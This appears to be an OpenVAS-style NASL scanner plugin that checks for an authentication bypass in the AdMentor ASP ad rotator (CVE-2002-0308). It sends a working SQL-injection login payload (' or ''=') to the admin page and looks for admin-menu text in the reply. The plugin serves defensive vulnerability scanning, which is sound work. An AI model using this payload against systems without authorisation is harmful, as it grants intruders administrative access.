if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10880" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 4152 );
	script_cve_id( "CVE-2002-0308" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "AdMentor Login Flaw" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2002 SecurITeam" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Contact the author for a patch." );
	script_tag( name: "summary", value: "AdMentor is a totally free ad rotator script written entirely in ASP.

  A security vulnerability in the product allows remote attackers to cause the login administration ASP to
  allow them to enter without knowing any username or password (thus bypassing any authentication
  protection enabled for the ASP file)." );
	script_xref( name: "URL", value: "http://www.securiteam.com/windowsntfocus/5DP0N1F6AW.html" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_asp( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/admentor", "/ads/admentor", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/admin/admin.asp?login=yes" );
	if(!http_is_cgi_installed_ka( item: url, port: port )){
		continue;
	}
	host = http_host_name( port: port );
	variables = NASLString( "userid=%27+or+%27%27%3D%27&pwd=%27+or+%27%27%3D%27&B1=Submit" );
	req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( variables ), "\\r\\n\\r\\n", variables );
	buf = http_keepalive_send_recv( port: port, data: req );
	if(!buf){
		continue;
	}
	if(ContainsString( buf, "Welcome" ) && ContainsString( buf, "Admin interface" ) && ContainsString( buf, "AdMentor Menu" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

